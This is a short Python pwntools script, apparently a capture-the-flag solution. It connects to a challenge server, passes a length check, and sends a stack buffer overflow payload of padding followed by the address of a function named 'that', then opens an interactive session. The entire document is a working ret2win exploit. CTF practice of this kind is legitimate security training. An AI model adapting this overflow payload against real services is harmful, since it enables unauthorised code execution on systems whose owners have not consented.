from pwn import *
context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show',28107)
elf = ELF('./pwn')
that = elf.sym['that']
io.recvuntil("How long are you?")
io.sendline(str(30))
io.recvuntil("Who are you?")
payload = b'a'*(0xE+8) + p64(that)
io.sendline(payload)
io.interactive()